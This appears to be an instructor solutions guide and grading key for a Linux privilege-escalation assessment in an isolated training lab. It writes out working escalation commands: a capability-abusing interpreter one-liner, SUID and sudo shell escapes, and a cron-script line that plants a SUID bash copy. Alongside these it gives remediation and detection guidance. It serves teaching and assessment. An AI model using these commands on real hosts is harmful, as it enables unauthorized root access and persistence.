# Instructor / solutions — Assessment 2 (Linux privilege escalation)

> Instructor material. Not linked from `_sidebar.md`. Have students complete the assessment before
> reading. All work targets the isolated `lab-04-linux-privesc` container (`ptlab04_target`), from
> the synthetic `lab` foothold, against the benign `/root/flag.txt` (`LAB-FLAG-{uuid}`). Never a
> real system.

## What this assesses

M04 as an unscaffolded engagement: from a `lab` shell, enumerate the privesc surface across all
five vector families, pick and *justify* one path, exploit and verify it, and write a report-ready
finding with mechanism, remediation, and detection. The lesson exercise (module-04) asked for the
same skills with more hand-holding; here the student gets only the foothold and the objective.

## The lab's planted vectors (per the lab README — multiple independent paths)

1. A **SUID binary** offering an exec primitive.
2. A **`sudo` NOPASSWD** entry on an interactive program.
3. A **root cron job** running a world-writable script (fires every minute).
4. A **Linux capability** on a copied interpreter.
5. A **SUID helper that invokes another program by relative name** (PATH matters).

Any of these is a valid answer. Grade the *mechanism + verification + remediation + detection*, not
the choice. Because the box mixes vectors, students who did 04.2 with one vector should be nudged
to pick a *different* one here.

## Intended "best" path and the four deliverables

The cleanest, most deterministic paths are the **SUID exec primitive**, the **sudo-allowed
interactive binary**, and the **capability on an interpreter** (no waiting, no race). A model
submission — using the capability path as the example — contains all four:

**1. Enumeration → candidate set.**
- `find / -perm -4000 -type f 2>/dev/null` → the SUID binaries (look each up on GTFOBins).
- `sudo -l` → the NOPASSWD entry; note `env_keep`/`SETENV` if present.
- `getcap -r / 2>/dev/null` → the interpreter with `cap_setuid+ep`.
- crontabs (`/etc/crontab`, `/etc/cron.*`) + `pspy` → the root job on the world-writable script;
  `ls -la` the script/dir to confirm writability.
- `strings`/read the SUID helper → the bare command name it calls.

**2. Mechanism (the graded core).** For the capability path: privileged actor = the interpreter
itself, which the kernel permits to `setuid(0)` because it holds `cap_setuid`; controlled input =
the code the interpreter runs (arbitrary, by definition); primitive = "become root then exec a
shell." This is CWE-250 (unnecessary privilege) — the capability is equivalent to SUID-root on an
interpreter. Students must articulate why the privilege transfers (interpreter runs *their* code;
the capability lets that code change UID).

**3. Reproduction + verification.**
- Capability: `<interp> -c 'import os; os.setuid(0); os.system("/bin/bash")'` → `id` = `uid=0(root)`
  → `cat /root/flag.txt` = `LAB-FLAG-{uuid}`.
- SUID shell binary: `<suidbin> … -exec /bin/sh -p \;` (or the GTFOBins primitive) — **`-p` is
  required** or the shell drops the effective UID.
- sudo interactive binary: `sudo <bin> …` then the pager/editor shell escape (`!sh` / `:!sh`).
- cron writable script: append `cp /bin/bash /tmp/rb; chmod +s /tmp/rb`, wait one tick,
  `/tmp/rb -p`.
- Verification is part of the finding — no `id`/flag output = not proven.

**4. Remediation + detection.**
- Capability: `setcap -r <binary>`; never grant `cap_setuid`/`cap_dac_*` to an interpreter; audit
  with `getcap -r /`. Detect: a root shell parented by an interpreter that holds a capability;
  auditd `execve`. ATT&CK **T1548**.
- (SUID) `chmod u-s`; detect SUID binary spawning a shell. (sudo) narrow the rule / remove abusable
  binary; sudo logs in `/var/log/auth.log`; T1548.003. (cron) absolute-path, root-owned,
  non-writable script in a non-writable dir; FIM + pspy anomalies; T1053. (PATH) call by absolute
  path, clean `PATH`; CWE-426.
- **Cleanup note required:** dropped SUID binary (`/tmp/rb`), appended cron line, exported PATH,
  compiled `.so` — record and restore; `./labs/lab reset lab-04-linux-privesc`.

## Common wrong turns

- Pasting a GTFOBins line with no mechanism ("ran it, got root") — fails the core dimension.
- Forgetting `-p` on a SUID shell and concluding the vector doesn't work.
- Trusting a LinPEAS flag without hand-verification (a SUID binary not on GTFOBins, or a sudo rule
  for a genuinely safe binary, is not a path).
- Claiming the cron path without confirming the script/dir is actually writable, or without
  accounting for the tick.
- Delivering the shell but omitting remediation **or** detection (both required), or omitting the
  cleanup note.
- Not resetting between attempts, then reporting an environment they mutated.

## Expected evidence / markers

`id` = `uid=0(root)`, `whoami` = `root`, `cat /root/flag.txt` = `LAB-FLAG-{uuid}`. `verify.py`
checks the vectors are present and the box is isolated — it is a lab-health acceptance test, not a
solution.

## Grading key (100 pts)

| Dimension | Pts | Award full when… | Deduct when… |
|---|---|---|---|
| Method | 20 | enumerated all five families; stated candidate set; justified the pick (reliability × effort × noise) | one-shot LinPEAS; no candidate set; no justification |
| Evidence | 15 | `id`/`whoami`/flag captured; reproducible without them | "got root" with no output |
| Exploitation &amp; mechanism | 25 | primitive + privilege-inheritance reasoning correct and explicit (`-p`, `LD_PRELOAD`, glob→options, `setuid`) | command with no "why"; wrong mechanism |
| Impact | 15 | root = full host compromise in business terms (data, persistence, lateral) | "it's bad" |
| Remediation &amp; detection | 15 | specific least-privilege fix **and** ATT&CK-mapped detection | one of the two missing; hand-wave |
| Reporting | 10 | template filled; CVSS justified; cleanup noted | missing fields; no cleanup note |

CVSS for a local root: high, e.g. `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` ≈ 7.8 (High).
Accept a defended score; PR:L reflects the required foothold.
